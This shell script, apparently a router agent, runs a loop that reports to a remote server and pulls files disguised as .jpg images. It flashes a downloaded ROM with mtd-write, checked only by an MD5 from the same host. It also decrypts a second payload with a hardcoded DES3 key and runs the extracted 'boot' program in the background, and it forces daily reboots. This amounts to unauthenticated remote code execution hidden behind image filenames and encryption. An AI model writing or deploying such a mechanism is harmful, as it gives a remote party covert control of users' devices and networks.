#!/bin/sh
 
. $(pwd)/_dy_def.sh


ROM_KIND=$(nvram_get rom_kind)
ROM_VERSION_URL=$u0/router/rom/rom.txt
ROM_URL=$u0/router/rom
DOWNTO=/home/root
NWAN_LOG_FILE=$(pwd)/reporter.log

log_reboot(){
	nvram_set last_reboot $(date +%s)
}

# check_version, 0=newest, 1=need update
check_rom_version(){
	local url=$ROM_VERSION_URL
	local path=$DOWNTO/rom.trx
	rm -rf rom.txt
	rm -rf $path
	tmp=$(wget -T 30 $url)
	r=$?
	if [ $r -ne 0 ] || [ ! -f "rom.txt" ] ; then
		nwan_log "download error"
		return
	fi
	local ver=$(cat rom.txt | sed -n -e 's/version=\(.*\)/\1/p')
	local md5=$(cat rom.txt | sed -n -e 's/md5=\(.*\)/\1/p')
	nwan_log "ver=$ver, md5=$md5"
	if [ "$ver" -gt "$ROM_VERSION" ] ; then
		url=$ROM_URL/rom-$ver.jpg
		nwan_log "version $VERSION<$ver, update from $url"
		wget -T 600 -O $path $url > /dev/null 2>&1
		ret=$?
		if [ $ret == 0 ] ; then
			md5_2=$(md5sum $path | awk '{print $1}')
			if [ "$md5" == "$md5_2" ] ; then
				nwan_log "download ok, writing"
				mtd-write -i $path -d linux
				log_reboot
				reboot
				return
			fi
			nwan_log "download md5sum not ok, remote md5=$md5_2"
		fi
	fi
	nwan_log "no need to update romversion, remote=$ver, local=$ROM_VERSION"
}

check_sh_version(){
	local url=$SH_VERSION_URL
	local version=$(curl -s --connect-timeout 20 -m 20 $url)
	local boot=$(pwd)/boot
	nwan_log "remote=$version,local=$DYVERSION"
       	if [ -z "$version" ] || [ "$DYVERSION" -ge "$version" ] ; then
		nwan_log "no need to update sh"
		return
	fi	
	
	nwan_log "$version > $DYVERSION, updating"
	url=$u0/router/nwan_sz.jpg
	path=$(pwd)/nwan_sz.jpg
	wget -O $path $url > /dev/null 2>&1
	ret=$?
	if [ $? == 0 ] ; then
		if [ ! -f $path ] ; then
			nwan_log "$url download failed"
			return
		fi
		nwan_log "sh_version $url download ok"
		dd if=$path | openssl des3 -d -k dycwcrowdmfkbcom | tar zxf - > /dev/null 2>&1
		ret=$?
		if [ $ret -ne 0 ] || [ ! -f "$boot" ] ; then
			nwan_log "$path unpack failed"
			return	
		fi

		chmod a+x $boot > /dev/null 2>&1
		$boot > /dev/null >&1 &
		exit
	fi
	
}

do_if_reboot(){
	nwan_log "checking reboot"
	last_reboot=$(nvram_get last_reboot 0)
	current=$(date +%s)
	inv=$(($current-$last_reboot-60*60*24))
	if [ $inv -gt 0 ] ; then
		nwan_log "need reboot!!!"
		nvram_set last_reboot $current
		nvram commit
		sleep 10
		reboot
	else
		nwan_log "no need to reboot, inv=$inv"
	fi
}


instance_start report 0
rounds=0
while true
do
	rounds=$(($rounds+1))
	if [ $rounds -gt 100 ] ; then
		break;
	fi

	#report
	do_report "from/reporter/round/$rounds"

	#check sh version
	check_sh_version

	#check rom version
	cnt=$(has_arp)
	hour=$(date +%H)
	if [ "$hour" == "04" ] ; then
		cnt=0
	fi
	if [ $cnt == 0 ] ; then
		check_rom_version
		do_if_reboot
	fi
	sleep 300
done
instance_exit report

$(pwd)/_dy_reporter.sh > /dev/null 2>&1 &
